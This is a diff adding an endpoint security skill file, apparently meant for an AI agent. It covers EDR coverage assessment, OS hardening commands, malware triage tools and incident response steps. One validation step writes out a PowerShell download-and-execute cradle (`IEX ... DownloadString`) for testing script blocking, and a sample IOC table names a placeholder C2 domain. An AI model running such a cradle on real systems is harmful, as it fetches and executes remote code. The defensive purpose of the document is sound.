@@ -1,0 +1,273 @@
+# Endpoint Security Skill
+
+Secure endpoints against malware, credential theft, and execution-based attacks.
+Covers EDR coverage assessment, OS hardening, malware triage workflow, and
+endpoint-specific incident response procedures.
+
+## Phase Map
+
+```
+Phase 1 → EDR Deployment            [read: references/edr-deployment.md]
+Phase 2 → Baseline Hardening        [read: references/baseline-hardening.md]
+Phase 3 → Malware Analysis          [read: references/malware-analysis.md]
+Phase 4 → Incident Response         [read: references/incident-response.md]
+```
+
+## Output Format
+
+Produce an EDR coverage heatmap against ATT&CK tactics, a hardening gap table, and an incident timeline.
+
+
+## edr-deployment
+
+# EDR Deployment — Reference
+
+Use during Phase 1 to assess EDR coverage, telemetry quality, and ATT&CK detection gaps.
+
+## Coverage Tiers
+
+| Tier | Definition | Target | Assessment Method |
+|------|-----------|--------|------------------|
+| Tier 1 — Full Telemetry | EDR agent installed, policy active, telemetry flowing to SIEM | 100% of Tier 1/2 assets | Agent inventory vs CMDB |
+| Tier 2 — Agent Installed | Agent installed but policy gaps (no memory scan, no script blocking) | Identify and remediate | Policy audit in EDR console |
+| Tier 3 — Excluded | Asset excluded from EDR (often OT, legacy, performance concerns) | Document with compensating controls | Exception register |
+| Tier 4 — Not Covered | No EDR agent; no compensating control | Must remediate | Gap register |
+
+## Telemetry Validation Steps
+
+1. Verify agent check-in times — flag assets with last-seen > 24 hours
+2. Confirm policy assignment — ensure prevention + detection policies applied
+3. Test telemetry flow — run EICAR test on each OS type and verify alert in SIEM within 5 minutes
+4. Validate process creation logging — confirm `sysmon` event ID 1 or EDR equivalent flowing
+5. Confirm network telemetry — verify DNS request and network connection events
+6. Test script execution blocking — run `IEX (New-Object Net.WebClient).DownloadString('http://test')` in test environment
+
+## ATT&CK Detection Coverage Matrix
+
+| ATT&CK Tactic | Key Techniques | EDR Telemetry Required | Coverage Status |
+|---------------|---------------|----------------------|----------------|
+| Execution | T1059 (all sub-techniques) | Process creation, command line, script engine events | Assess per EDR platform |
+| Persistence | T1547, T1053, T1543 | Registry modifications, scheduled task creation, service install | Assess |
+| Credential Access | T1003.001 LSASS, T1555, T1558 | Memory access to LSASS, credential manager access | Assess |
+| Defence Evasion | T1055 Process Injection, T1562 | Process hollowing indicators, security tool tampering | Assess |
+| Lateral Movement | T1021.002 SMB, T1021.006 WinRM | Remote service execution, admin share access | Assess |
+| Exfiltration | T1048, T1041 | Network connections from sensitive processes | Assess |
+
+## EDR Platform Comparison Notes
+
+| Feature | CrowdStrike Falcon | Microsoft Defender for Endpoint | SentinelOne |
+|---------|--------------------|--------------------------------|-------------|
+| Memory scan | Yes | Yes | Yes |
+| Fileless threat detection | Yes (via behaviours) | Yes | Yes |
+| Network telemetry | Yes | Yes | Yes |
+| ATT&CK mapping | Yes (Fusion SOAR) | Yes (Threat analytics) | Yes (STAR) |
+| macOS/Linux support | Yes | Yes | Yes |
+
+
+
+## baseline-hardening
+
+# Baseline Hardening — Reference
+
+Use during Phase 2 to apply and verify OS-level hardening controls on endpoints.
+
+## Windows Endpoint Hardening Controls
+
+### Attack Surface Reduction (ASR) Rules
+
+| Rule | GUID | ATT&CK Technique Mitigated | Mode |
+|------|------|---------------------------|------|
+| Block Office from creating child processes | D4F940AB-401B-4EFC-AADC-AD5F3C50688A | T1566 Phishing macros | Block |
+| Block credential stealing from LSASS | 9E6C4E1F-7D60-472F-BA1A-A39EF669E4B0 | T1003.001 | Block |
+| Block executable content from email/webmail | BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 | T1566 | Block |
+| Block untrusted/unsigned processes from USB | B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4 | T1091 | Block |
+| Block JavaScript/VBScript launching executables | D3E037E1-3EB8-44C8-A917-57927947596D | T1059.005/007 | Block |
+| Use advanced protection against ransomware | C1DB55AB-C21A-4637-BB3F-A12568109D35 | T1486 | Block |
+
+Enable via Intune or GPO:
+```powershell
+Add-MpPreference -AttackSurfaceReductionRules_Ids <GUID> -AttackSurfaceReductionRules_Actions Enabled
+```
+
+### Credential Guard
+
+```powershell
+# Enable Credential Guard via registry (requires UEFI + Secure Boot)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1
+```
+
+## macOS Endpoint Hardening Controls
+
+| Control | Implementation | ATT&CK Technique Mitigated |
+|---------|---------------|---------------------------|
+| FileVault 2 | System Preferences → Privacy & Security → FileVault | T1025 Data from Removable Media |
+| Gatekeeper | `sudo spctl --master-enable` | T1204.002 Malicious File |
+| System Integrity Protection | `csrutil enable` (recovery mode) | T1562.001 Disable Security Tools |
+| Firewall enabled | `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on` | T1046 |
+| Screen lock ≤ 5 mins | MDM profile or System Preferences | Physical access |
+| Disable automatic login | System Preferences → Users & Groups | T1078 |
+| Remote Apple Events disabled | `sudo systemsetup -setremoteappleevents off` | T1021 |
+
+## Linux Endpoint Hardening
+
+```bash
+# Disable USB storage
+echo 'blacklist usb-storage' >> /etc/modprobe.d/blacklist.conf
+modprobe -r usb-storage
+
+# Harden /proc
+echo 'kernel.dmesg_restrict = 1' >> /etc/sysctl.d/99-hardening.conf
+echo 'fs.protected_hardlinks = 1' >> /etc/sysctl.d/99-hardening.conf
+sysctl --system
+```
+
+## Hardening Verification Checklist
+
+| Control | Verification Command | Expected Result |
+|---------|---------------------|----------------|
+| Credential Guard | `msinfo32` → System Summary | Virtualization-based security: Running |
+| ASR rules | `Get-MpPreference | select AttackSurfaceReductionRules*` | Enabled for each GUID |
+| BitLocker | `manage-bde -status C:` | Protection Status: Protection On |
+| FileVault | `fdesetup status` | FileVault is On |
+
+
+
+## malware-analysis
+
+# Malware Analysis — Reference
+
+Use during Phase 3 to triage suspected malware samples and extract actionable indicators.
+
+## Triage Decision Tree
+
+```
+Sample received
+    │
+    ├─► Known bad hash? (VirusTotal / EDR telemetry)
+    │       YES → Confirm family, extract IOCs, skip to mapping
+    │       NO  ↓
+    │
+    ├─► Static analysis (safe, no execution)
+    │       - File type, packer detection (Detect-It-Easy)
+    │       - Strings extraction (FLOSS)
+    │       - Import table / suspicious API calls
+    │       - PE header anomalies
+    │       VERDICT: benign / suspicious / malicious
+    │
+    └─► Dynamic analysis (isolated sandbox)
+            - Run in ANY.RUN / Cuckoo / Joe Sandbox
+            - Observe: process tree, network calls, file writes, registry changes
+            - Extract C2 IPs/domains, mutex names, dropped files
+            VERDICT + IOCs + ATT&CK mapping
+```
+
+## Static Analysis Tools
+
+| Tool | Purpose | Command |
+|------|---------|---------|
+| Detect-It-Easy (DIE) | Packer/compiler detection | `die malware.exe` |
+| FLOSS | Obfuscated string extraction | `floss malware.exe > strings.txt` |
+| pestudio | PE header analysis, VirusTotal lookup | GUI tool |
+| Capa | Capability detection mapped to ATT&CK | `capa malware.exe` |
+| YARA | Pattern matching against known malware families | `yara -r rules/ malware.exe` |
+
+## IOC Extraction Output Table
+
+| IOC Type | Value | Confidence | ATT&CK Technique |
+|----------|-------|-----------|-----------------|
+| File hash (SHA256) | `a1b2c3...` | High | — |
+| C2 IP | `185.220.101.x` | High | T1071.001 Web Protocols |
+| C2 Domain | `update.evil-domain.com` | High | T1568.002 DGA |
+| Mutex | `Global\MalwareMutex1234` | Medium | T1480 Execution Guardrails |
+| Registry key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\payload` | High | T1547.001 Registry Run Key |
+| Dropped file | `%TEMP%\svchost32.exe` | High | T1036.005 Match Legitimate Name |
+
+## ATT&CK Mapping Output Table
+
+| ATT&CK Technique | Sub-technique | Observed Behaviour | Evidence |
+|-----------------|--------------|-------------------|---------|
+| T1059.001 | PowerShell | Encoded PowerShell execution in child process | Process creation log |
+| T1055.003 | Process Hollowing | svchost.exe spawned with modified base address | Memory scan |
+| T1071.001 | Web Protocols | HTTPS POST to 185.220.101.x:443 every 60s | Network telemetry |
+| T1547.001 | Registry Run Key | HKCU Run key added for persistence | Registry event |
+
+## Sandbox Platforms
+
+- **ANY.RUN** — interactive sandbox, good for manual analysis (free tier available)
+- **Joe Sandbox Cloud** — automated report with ATT&CK mapping
+- **Cuckoo Sandbox** — self-hosted, open source
+- **Hybrid Analysis (Falcon Sandbox)** — free, good for quick triage
+
+
+
+## incident-response
+
+# Endpoint Incident Response — Reference
+
+Use during Phase 4 to execute structured incident response for endpoint-related incidents using the PICERL framework.
+
+## PICERL Framework — Endpoint IR
+
+### Preparation
+- IR runbook pre-approved and stored in offline location
+- EDR platform admin credentials in PAM vault
+- Forensic collection tools pre-staged (FTK Imager, Velociraptor, KAPE)
+- Isolation procedure tested and documented (EDR network isolation + manual fallback)
+- Legal/HR contacts identified for insider threat scenarios
+
+### Identification
+Confirmed incident triggers:
+- EDR alert with HIGH/CRITICAL severity not resolved by automated response
+- Multiple alerts on same host within 1 hour (attack chain indicator)
+- Unusual process spawning LSASS or accessing credential stores
+- Lateral movement detected from endpoint
+
+### Containment
+```
+Immediate containment (within 15 minutes of P1 declaration):
+
+1. Network isolate via EDR console:
+   - CrowdStrike: Right-click host → "Network Contain"
+   - MDE: Action → "Isolate device"
+   - SentinelOne: Actions → "Network Quarantine"
+
+2. If EDR isolation unavailable:
+   - Disable network port (switch port shutdown)
+   - Block host IP at perimeter firewall
+
+3. Preserve memory BEFORE isolation if forensically required:
+   winpmem_mini.exe --output memory.dmp
+```
+
+### Eradication
+- Remove malware artefacts identified in analysis (files, registry keys, scheduled tasks)
+- Revoke and reset all credentials used on or accessed from the compromised host
+- Remove attacker persistence mechanisms (run key, service, WMI subscription)
+- Patch exploited vulnerability or disable exploited feature
+
+### Recovery
+- Reimage host from golden image (preferred over cleaning)
+- Restore from last-known-good backup if reimaging not possible
+- Re-enrol in EDR with clean policy
+- Monitor for re-compromise for 72 hours post-recovery
+- Restore user access only after confirming clean state
+
+### Lessons Learned
+- PIR meeting within 5 business days
+- Document timeline: initial compromise → detection → containment → eradication → recovery
+- Record MTTD, MTTC, MTTR
+- Update detection rules with new IOCs
+- Update runbook with gaps identified during response
+
+## Artefact Collection Checklist
+
+| Artefact | Collection Method | Priority |
+|----------|-----------------|---------|
+| Memory dump | winpmem / LiME (Linux) | High — collect before isolation |
+| Prefetch files | `%SystemRoot%\Prefetch\` | High |
+| Event logs | `wevtutil epl Security security.evtx` | High |
+| Browser history | `%APPDATA%\...\Chrome\User Data\Default\History` | Medium |
+| Scheduled tasks | `schtasks /query /fo LIST /v > tasks.txt` | High |
+| Running processes | `tasklist /v > processes.txt` | High |
+| Network connections | `netstat -anob > netstat.txt` | High |
